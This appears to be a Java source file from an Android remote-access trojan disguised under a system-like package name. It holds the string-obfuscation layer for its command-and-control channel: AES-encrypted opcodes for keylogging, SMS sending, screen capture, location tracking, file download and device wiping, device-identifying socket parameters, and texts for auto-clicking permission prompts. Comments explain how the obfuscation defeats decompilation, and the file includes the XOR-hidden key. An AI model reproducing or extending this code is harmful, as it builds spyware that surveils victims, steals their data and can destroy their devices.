package com.android.background.services;

/**
 * Runtime string deobfuscation for C2 opcodes, URLs, and JSON keys.
 *
 * AES-128-ECB decryption is performed in a native .so library
 * (obfuscation_native) loaded via System.loadLibrary. The AES key
 * exists ONLY in native code, XOR-obfuscated there as well — even
 * decompiling the Java bytecode gives no access to the key or the
 * decryption algorithm.
 *
 * The encrypted byte arrays (ENC_*) are stored in Java as public
 * static final fields. They appear as random noise in the DEX.
 *
 * Usage:
 *   String opcode = ObfuscationUtils.decrypt(ENC_X0000SM);
 *
 * To add new strings:
 *   1. Add the plaintext to .freebuff/generate-encrypted-bytes.js
 *   2. Run: node .freebuff/generate-encrypted-bytes.js
 *   3. Copy the output ENC_* constants into this file
 *   4. Rebuild the native library (CMake handles this automatically)
 */
public class ObfuscationUtils {

    // ============================================================
    // NATIVE LIBRARY
    // ============================================================

    // ============================================================
    // JAVA AES FALLBACK (used when native .so cannot be loaded)
    // ============================================================

    /** Flag: null means not checked yet, true = native loaded, false = fallback */
    private static Boolean nativeLoaded = null;

    /* WARNING: The hex literals are the BYTE VALUES, NOT ASCII character codes!
     * 'a' = 0x61, NOT 0xa1. The original key is UTF-8 "a1b2c3d4e5f6g7h8".
     *
     * First half bytes: 0xCB = 0x61 ^ 0xAA, 0x9B = 0x31 ^ 0xAA, ...
     * Second half bytes: 0x30 = 0x65 ^ 0x55, 0x60 = 0x35 ^ 0x55, ...
     *
     * Must be declared BEFORE the static block to avoid forward-reference NPE.
     * Same scheme as native obfuscation_jni.c. */
    private static final byte[] KEY_XOR_1 = { (byte)0xCB, (byte)0x9B, (byte)0xC8, (byte)0x98, (byte)0xC9, (byte)0x99, (byte)0xCE, (byte)0x9E };
    private static final byte[] KEY_XOR_2 = { (byte)0x30, (byte)0x60, (byte)0x33, (byte)0x63, (byte)0x32, (byte)0x62, (byte)0x3D, (byte)0x6D };

    /** AES key (only used if native library fails to load) */
    private static final byte[] JAVA_AES_KEY;

    static {
        // Build AES key from obfuscated halves (same scheme as native code)
        JAVA_AES_KEY = new byte[16];
        for (int i = 0; i < 8; i++) {
            JAVA_AES_KEY[i] = (byte)((KEY_XOR_1[i] ^ 0xAA) & 0xFF);
        }
        for (int i = 8; i < 16; i++) {
            JAVA_AES_KEY[i] = (byte)((KEY_XOR_2[i - 8] ^ 0x55) & 0xFF);
        }

        try {
            System.loadLibrary("obfuscation_native");
            nativeLoaded = true;
        } catch (UnsatisfiedLinkError e) {
            // Native library not available — use Java AES fallback
            nativeLoaded = false;
            logW("ObfuscationUtils",
                "Native library not loaded, using Java AES fallback");
        }
    }

    /**
     * Native AES-128-ECB decrypt.
     * Decrypts the given encrypted byte array, strips PKCS7 padding,
     * and returns the plaintext as a Java String.
     */
    private static native String nativeDecrypt(byte[] encrypted);

    /**
     * Native AES decrypt + string compare.
     * More efficient than decrypt+equals for dispatch if-else chains.
     */
    private static native boolean nativeMatches(byte[] encrypted, String value);

    /**
     * Native AES decrypt + case-insensitive string compare.
     * Compares entirely in native code to avoid exposing decrypted strings on Java heap.
     */
    private static native boolean nativeMatchesIgnoreCase(byte[] encrypted, String value);

    // ============================================================
    // PUBLIC API
    // ============================================================

    /**
     * Decrypts an AES-128-ECB encrypted byte array back to a plaintext string.
     * Thread-safe. Uses native code when available; falls back to Java javax.crypto.
     */
    public static String decrypt(byte[] encrypted) {
        if (encrypted == null) return "";
        try {
            if (nativeLoaded != null && nativeLoaded) {
                return nativeDecrypt(encrypted);
            } else {
                return javaDecrypt(encrypted);
            }
        } catch (Exception e) {
            logE("ObfuscationUtils", "Decrypt failed", e);
            return "";
        }
    }

    /**
     * Decrypts an opcode and compares it to the given string.
     * Uses native code to avoid exposing decrypted strings in Java heap.
     */
    public static boolean matches(byte[] encrypted, String value) {
        if (value == null || encrypted == null) return false;
        try {
            if (nativeLoaded != null && nativeLoaded) {
                return nativeMatches(encrypted, value);
            } else {
                String decrypted = javaDecrypt(encrypted);
                return decrypted.equals(value);
            }
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Decrypts an opcode and compares case-insensitively.
     * Uses native code when available (avoids exposing decrypted string on Java heap).
     */
    public static boolean matchesIgnoreCase(byte[] encrypted, String value) {
        if (value == null || encrypted == null) return false;
        try {
            if (nativeLoaded != null && nativeLoaded) {
                return nativeMatchesIgnoreCase(encrypted, value);
            } else {
                String decrypted = javaDecrypt(encrypted);
                return value.equalsIgnoreCase(decrypted);
            }
        } catch (Exception e) {
            return false;
        }
    }

    // ============================================================
    // ENCRYPTED BYTE ARRAYS — C2 Opcodes
    // Auto-generated by: node .freebuff/generate-encrypted-bytes.js
    // ============================================================

    // "x0000ca" (16 bytes) — All opcode constants are public for cross-class access
    public static final byte[] ENC_X0000CA = {27, -51, -128, -83, 51, 102, 62, 90, -56, 110, 88, -82, 101, -17, 55, 127};
    public static final byte[] ENC_X0000FM = {4, -62, 33, 57, 49, 11, -66, -27, -8, 61, -46, 11, 57, -74, 78, 123};
    public static final byte[] ENC_X0000SM = {-38, 55, 82, 69, -50, -2, 111, -84, -27, -51, -120, 60, 11, 9, -58, -16};
    public static final byte[] ENC_X0000CL = {-32, 90, 35, 1, -113, 107, 37, 62, 70, 113, -62, -3, 85, -119, -45, -77};
    public static final byte[] ENC_X0000CN = {94, -105, -32, -5, 19, 36, -23, 58, -81, 80, 65, 92, 45, -49, -84, -5};
    public static final byte[] ENC_X0000MC = {-96, -34, 71, 61, 0, -32, -123, 127, 53, -34, 115, -115, 66, 47, 39, -113};
    public static final byte[] ENC_X0000APPS = {54, -122, -4, 13, 106, 32, 95, 107, 42, -54, 108, 86, -13, -57, 60, -19};
    public static final byte[] ENC_X0000LM = {75, 10, 68, 122, 70, -28, -34, 3, 74, 107, -92, -95, -21, -122, -74, -65};
    public static final byte[] ENC_X0000RUNAPP = {118, 14, -112, 6, -48, 37, -37, -30, 6, -71, 33, -117, 1, -2, 76, 11};
    public static final byte[] ENC_X0000OPENURL = {-59, -36, -114, 13, 105, -100, -72, -18, -101, 103, -127, -74, 114, -50, -25, -107};
    public static final byte[] ENC_X0000DELETEFF = {-16, 103, -100, 22, 29, -35, -82, -21, 82, -53, 48, 117, -111, 120, -12, -52};
    public static final byte[] ENC_X0000DM = {-55, 92, -93, -63, 0, -97, 115, 17, -123, -103, 52, 63, -111, -20, -120, 121};
    public static final byte[] ENC_X0000LOCKDEVICE = {-103, -60, -89, 100, -63, -65, -2, -32, 67, 31, 88, -127, -27, -74, -90, 100};
    public static final byte[] ENC_X0000WIPEDEVICE = {12, -74, -75, -11, 4, 61, -34, -124, 112, -86, -14, -49, -57, -109, 65, 60};
    public static final byte[] ENC_X0000REBOOTDEVICE = {91, 75, -20, -52, 0, 125, -100, 91, 117, -60, -118, 123, 117, 63, -6, 120, 59, 41, 94, 80, -112, 59, -15, -78, -47, 34, 88, -73, -12, -61, 102, 36};
    public static final byte[] ENC_X0000SC = {-1, -105, -58, -18, 69, -122, -40, -14, -55, 46, 19, 4, -14, -116, 104, -20};
    public static final byte[] ENC_X0000KL = {-99, -128, 49, 81, -20, -111, -124, -20, -80, -109, -108, 103, 39, -123, 13, -79};
    public static final byte[] ENC_X0000KLDATA = {25, -21, 27, 13, -69, 71, -111, 3, -90, -105, -93, 95, 119, 95, 121, 7};
    public static final byte[] ENC_X0000NT = {125, 83, -72, 67, -110, -81, -108, -55, -118, 71, 61, 122, -85, 106, 66, 20};

    // ============================================================
    // JSON keys
    // ============================================================

    // "order" (16 bytes)
    public static final byte[] ENC_ORDER = {74, 41, 95, 9, 32, 103, -60, 57, 49, 105, -97, -69, -93, 89, 18, 126};

    // "extra" (16 bytes)
    public static final byte[] ENC_EXTRA = {-2, -89, 79, -39, 36, -52, 81, 48, 40, -116, -85, -113, 127, -95, -78, -75};

    // "status" (16 bytes)
    public static final byte[] ENC_STATUS = {62, 26, 124, 3, -5, -7, -12, -30, -59, -76, 2, 106, 59, 40, -80, 68};

    // "message" (16 bytes)
    public static final byte[] ENC_MESSAGE = {-44, 42, 63, -41, 64, -54, 59, -108, 28, 55, 89, -26, 15, 119, -43, 56};

    // "enable" (16 bytes)
    public static final byte[] ENC_ENABLE = {52, -23, -120, -51, 34, -103, 80, -106, 40, -35, -43, 12, 73, -98, 116, -55};

    // "lat" (16 bytes)
    public static final byte[] ENC_LAT = {111, 109, -100, -33, -103, -8, -72, -103, 75, -74, 85, -127, 127, 96, -74, -80};

    // "lng" (16 bytes)
    public static final byte[] ENC_LNG = {-73, 22, -84, -70, 68, -76, 126, -46, 45, -4, -90, -54, -14, 66, 51, 78};

    // "action" (16 bytes)
    public static final byte[] ENC_ACTION = {44, -3, -71, -9, -99, -49, 62, 67, -106, -3, -43, 25, -66, -101, 87, -125};

    // "state" (16 bytes)
    public static final byte[] ENC_STATE = {-99, -32, -3, -103, 120, -74, 37, -115, 108, -67, -3, -103, -49, 22, 113, 117};

    // "type" (16 bytes)
    public static final byte[] ENC_TYPE = {23, -125, 119, 124, 102, -83, -5, -23, 96, -117, -97, 88, 9, -26, -89, -73};

    // "text" (16 bytes)
    public static final byte[] ENC_TEXT = {-21, 75, -128, 39, -77, -124, 42, -17, -62, -4, 15, -72, -27, -20, -115, -120};

    // "package" (16 bytes)
    public static final byte[] ENC_PACKAGE = {80, 120, 59, 51, -86, 101, -126, -47, 119, 83, 117, -66, -25, 10, 72, 61};

    // "fileFolderPath" (16 bytes)
    public static final byte[] ENC_FILEFOLDERPATH = {96, -36, -41, 113, 1, -124, -57, -69, -17, -105, -116, 14, -73, -99, -29, -84};

    // "launchingStatus" (16 bytes)
    public static final byte[] ENC_LAUNCHINGSTATUS = {-23, 110, -54, 46, 114, 94, 25, -95, 88, -102, -29, 60, 126, 91, -115, -67};

    // "path" (16 bytes)
    public static final byte[] ENC_PATH = {106, 83, -18, -84, -45, 41, -10, -12, 41, -9, -5, 32, -122, -86, 59, -49};

    // "token" (16 bytes)
    public static final byte[] ENC_TOKEN = {96, 65, 16, 107, -78, 79, 71, -71, 92, 64, -33, 26, 119, 76, 104, -73};

    // "camList" (16 bytes)
    public static final byte[] ENC_CAMLIST = {20, -84, 42, 9, -52, -27, 86, -34, 30, 25, 58, -8, -123, -46, -115, -16};

    // "ls" (16 bytes)
    public static final byte[] ENC_LS = {-40, -2, 39, -92, -86, 53, 51, -109, 9, -124, 108, -79, -107, 124, -89, 8};

    // "dl" (16 bytes)
    public static final byte[] ENC_DL = {-54, -40, 55, 69, 47, 127, -95, -29, 69, -115, -97, -79, -13, -67, -87, 111};

    // "sendSMS" (16 bytes)
    public static final byte[] ENC_SENDSMS = {-39, 109, 19, -59, -94, 24, -105, -111, 0, -38, -64, 9, 55, -100, 66, -107};

    // "to" (16 bytes)
    public static final byte[] ENC_TO = {-119, 122, 62, -79, 112, -90, -73, 9, 29, 76, -84, 46, -28, 35, 56, 9};

    // "sms" (16 bytes)
    public static final byte[] ENC_SMS = {39, 58, -75, -119, -54, 46, -52, 86, 64, -42, 65, -5, -20, -117, -64, -95};

    // "sec" (16 bytes)
    public static final byte[] ENC_SEC = {-45, 24, 60, -80, -23, 16, -6, 94, -90, 49, 33, -74, -19, -6, -98, -1};

    // "number" (16 bytes)
    public static final byte[] ENC_NUMBER = {-55, 73, -93, -69, 24, -25, 107, -95, 119, -57, -37, 7, 84, -23, 58, 91};

    // "url" (16 bytes)
    public static final byte[] ENC_URL = {-95, -68, 51, -82, -74, 46, 109, 17, 32, -84, 119, 86, 19, -119, -87, 106};

    // ============================================================
    // Socket URL query params
    // ============================================================

    // "?model=" (16 bytes)
    public static final byte[] ENC_Q_MODEL_ = {-48, 56, 114, -20, -63, 109, -46, -27, 1, 83, 51, -17, 65, -22, -101, 54};

    // "&manf=" (16 bytes)
    public static final byte[] ENC_AMP_MANF_ = {-32, -22, -29, -79, 97, 28, -122, -14, 108, -40, -68, -37, -128, -91, -69, 7};

    // "&release=" (16 bytes)
    public static final byte[] ENC_AMP_RELEASE_ = {-18, -85, 8, 28, 74, 41, -71, -114, -18, -74, -119, 115, -3, -22, -63, 127};

    // "&id=" (16 bytes)
    public static final byte[] ENC_AMP_ID_ = {-44, -88, 124, 32, -44, -55, 23, -87, 55, 28, -12, 41, 71, -31, -95, -113};

    // "viewId" (16 bytes)
    public static final byte[] ENC_VIEWID = {76, -46, -59, -10, -37, -120, 14, -7, -6, 2, 26, -119, 125, 13, -33, -108};

    // "clipboard" (16 bytes)
    public static final byte[] ENC_CLIPBOARD = {106, 45, -126, -56, -26, 116, -104, 89, -44, -53, -51, 114, -64, -66, 28, 110};

    // "hint" (16 bytes)
    public static final byte[] ENC_HINT = {115, 6, 71, 80, 51, -112, -106, 41, 22, 58, -70, -93, -40, -27, -24, 88};

    // ============================================================
    // Socket.IO event names ("ping", "pong")
    // ============================================================

    // "ping" (16 bytes)
    public static final byte[] ENC_PING = {67, 63, -69, -3, -50, -55, 32, 92, -15, 25, 58, 81, -87, -108, 74, 26};

    // "pong" (16 bytes)
    public static final byte[] ENC_PONG = {13, -59, 32, 62, -28, -73, 56, -127, 68, -43, 12, -31, 106, 53, -34, 86};

    // Auto-grant button texts
    // "Allow" (16 bytes)
    public static final byte[] ENC_ALLOW = {1, 18, -95, -51, 87, 1, -14, -64, 112, 9, 18, 33, 123, -10, 13, 110};

    // "Install" (16 bytes)
    public static final byte[] ENC_INSTALL = {26, 69, -46, -95, -73, -47, -6, -24, -104, -15, -70, 20, 102, 74, -88, -17};

    // "Continue" (16 bytes)
    public static final byte[] ENC_CONTINUE = {69, 10, -66, 70, 19, 79, -5, -128, 74, -89, -107, -79, 55, -105, 41, -86};

    // "Grant" (16 bytes)
    public static final byte[] ENC_GRANT = {41, 71, -85, 52, 3, -92, 30, 75, 106, 79, -38, 69, -105, 69, -119, 22};

    // ============================================================
    // JAVA FALLBACK METHODS
    // ============================================================

    /**
     * Java-based AES-128-ECB decrypt, used when native library is unavailable.
     * This is the same algorithm as the native implementation.
     */
    // ============================================================
    // SAFE LOGGING (guarded for unit test compatibility)
    // ============================================================

    /**
     * Safe wrapper around android.util.Log.w that catches
     * RuntimeException thrown by Android stubs in unit test environments.
     */
    private static void logW(String tag, String msg) {
        try {
            android.util.Log.w(tag, msg);
        } catch (RuntimeException ignored) {}
    }

    /**
     * Safe wrapper around android.util.Log.e that catches
     * RuntimeException thrown by Android stubs in unit test environments.
     */
    private static void logE(String tag, String msg, Throwable t) {
        try {
            android.util.Log.e(tag, msg, t);
        } catch (RuntimeException ignored) {}
    }

    // ============================================================
    // JAVA FALLBACK METHODS
    // ============================================================

    /**
     * Java-based AES-128-ECB decrypt, used when native library is unavailable.
     * This is the same algorithm as the native implementation.
     */
    private static String javaDecrypt(byte[] encrypted) {
        try {
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
            javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(JAVA_AES_KEY, "AES");
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec);
            byte[] decrypted = cipher.doFinal(encrypted);
            return new String(decrypted, "UTF-8");
        } catch (Exception e) {
            logE("ObfuscationUtils", "Java decrypt failed", e);
            return "";
        }
    }
}
